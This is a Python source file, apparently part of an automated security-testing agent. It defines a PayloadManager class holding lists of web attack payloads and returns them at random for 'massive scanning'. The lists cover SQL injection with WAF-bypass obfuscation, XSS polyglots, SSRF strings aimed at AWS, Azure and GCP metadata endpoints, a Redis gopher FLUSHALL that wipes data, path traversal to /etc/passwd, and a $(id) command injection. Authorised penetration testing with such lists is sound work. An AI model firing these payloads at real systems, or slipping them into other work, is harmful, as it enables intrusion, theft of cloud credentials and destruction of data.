import random
from typing import List, Dict

class PayloadManager:
    """
    Manages real-world security payloads for the agent.
    Includes Polyglots, Fuzzing strings, and specific attack vectors.
    Updated with 2024 WAF Bypass & Cloud Native techniques.
    """
    
    def __init__(self):
        # --- SQL Injection (2024 WAF Bypass Edition) ---
        self.sqli_payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "' UNION SELECT 1,2,3--",
            "admin' --",
            "admin' #",
            "' OR '1'='1' /*",
            "') OR ('1'='1",
            "admin'/*"
        ]
        
        self.sqli_time_based = [
            "'; WAITFOR DELAY '0:0:5'--",
            "'; SELECT SLEEP(5)--",
            "' OR SLEEP(5)#",
            "'; pg_sleep(5)--",
            "(SELECT BENCHMARK(1000000,MD5('A')))",
            "' OR IF(ASCII(SUBSTRING((SELECT database()),1,1))>97,SLEEP(5),SLEEP(0))--" # Conditional Time
        ]
        
        self.sqli_waf_bypass = [
            "' OR 0x534c454550283529--", # Hex Encoded SLEEP(5)
            "%23?%0auion%20?%23?%0aselect", # URL Encoded Obfuscation
            "'/*! UnIon/*trick-comment*/*/ sElect 1,2,3--", # Comment Obfuscation
            "{\"username\": \"admin' OR 1=1--\"}", # JSON Injection
            "admin' OR 1=1 /*!50000UNION*/ SELECT 1,2,3--" # Version specific comment
        ]
        
        # --- XSS (Cross-Site Scripting) ---
        self.xss_payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg/onload=alert(1)>",
            "javascript:alert(1)",
            "\"><script>alert(1)</script>",
            "'><img src=x onerror=alert(1)>"
        ]
        
        self.xss_polyglots = [
            "javascript://%250Aalert(1)//\"/*\\'/*\\'/*\"/*--></Script><Image Src=x OnError=alert(1)>",
            "\"`'><script>alert(1)</script>",
            "';alert(1)//",
            "jaVasCript:/*-/*\\`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e", # 2024 Ultimate Polyglot
            "--> <svg onload=alert()>"
        ]
        
        # --- SSRF (Cloud & Internal) ---
        self.ssrf_cloud = [
            "http://169.254.169.254/latest/meta-data/", # AWS
            "http://169.254.169.254/metadata/instance?api-version=2021-02-01", # Azure
            "http://metadata.google.internal/computeMetadata/v1/", # GCP
            "http://127.0.0.1:80", # Localhost
            "http://0x7f000001/", # Hex Encoded Localhost
            "file:///etc/passwd", # LFI via SSRF
            "gopher://127.0.0.1:6379/_FLUSHALL" # Redis Gopher Attack
        ]
        
        # --- Fuzzing / Anomalies ---
        self.fuzz_payloads = [
            "A" * 1000, # Buffer Overflow check
            "../../../../etc/passwd", # Path Traversal
            "%00", # Null byte
            "{{7*7}}", # SSTI
            "${7*7}", # SSTI
            "<!--", # Unclosed comment
            "'", # Single quote
            "\"", # Double quote
            ";", # Terminator
            "|", # Pipe
            "$(id)" # Command Injection
        ]
        
        # --- CTF Specific ---
        self.ctf_payloads = [
            "CTF",
            "flag",
            "admin",
            "root",
            "secret"
        ]

    def get_sqli(self, complexity: str = "simple") -> str:
        """Get an SQLi payload based on complexity"""
        if complexity == "time":
            return random.choice(self.sqli_time_based)
        elif complexity == "bypass":
            return random.choice(self.sqli_waf_bypass)
        return random.choice(self.sqli_payloads)

    def get_xss(self, complexity: str = "simple") -> str:
        """Get an XSS payload"""
        if complexity == "polyglot":
            return random.choice(self.xss_polyglots)
        return random.choice(self.xss_payloads)
        
    def get_ssrf(self) -> str:
        """Get an SSRF payload"""
        return random.choice(self.ssrf_cloud)

    def get_fuzz(self) -> str:
        """Get a fuzzing payload"""
        return random.choice(self.fuzz_payloads)
        
    def get_all_payloads(self) -> List[str]:
        """Return a flat list of all payloads for massive scanning"""
        return self.sqli_payloads + self.sqli_time_based + self.sqli_waf_bypass + \
               self.xss_payloads + self.xss_polyglots + \
               self.ssrf_cloud + self.fuzz_payloads + self.ctf_payloads
